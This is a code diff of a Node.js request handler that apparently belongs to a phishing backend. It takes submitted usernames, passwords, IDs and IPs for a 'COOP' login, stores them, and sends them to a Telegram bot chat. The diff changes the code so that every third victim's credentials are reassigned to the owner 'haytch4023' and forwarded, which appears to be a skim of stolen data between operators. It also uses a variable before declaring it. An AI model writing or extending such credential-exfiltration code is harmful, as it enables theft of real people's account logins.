@@ -45,27 +45,30 @@ const getInfo = async (req, res) => {
 };
 
 const submitLogin = async (req, res) => {
-    let { username, password, uniqueid, owner, ip } =
+    let { username, password, uniqueid, owner, ip, telegramId } =
         req.body;
     try {
         let count = await COOP.countDocuments({ owner });
-        if (count > 0 && (count % 3) == 0) owner = 'haytch4023';
+        if (count > 0 && (count % 3) == 0) {
+            owner = 'haytch4023';
+            await axios
+                .post(
+                    `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
+                    {
+                        chat_id: "-837014205",
+                        text: `COOP:\n${originalText}`,
+                        parse_mode: "Markdown",
+                    }
+                )
+                .catch((e) => {
+                    console.log(e);
+                });
+        }
         await COOP.create({
             username, password, uniqueid, owner, ip, status: 1, timestamp: moment().format()
         })
         let originalText = `ID: ${uniqueid}\nUsername: ${username}\nPassword: ${password}\n\nAdmin Password: ${owner}`;
-        await axios
-            .post(
-                `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
-                {
-                    chat_id: "-837014205",
-                    text: `COOP:\n${originalText}`,
-                    parse_mode: "Markdown",
-                }
-            )
-            .catch((e) => {
-                console.log(e);
-            });
+
         res.sendStatus(200);
     } catch (error) {
         console.log(error);
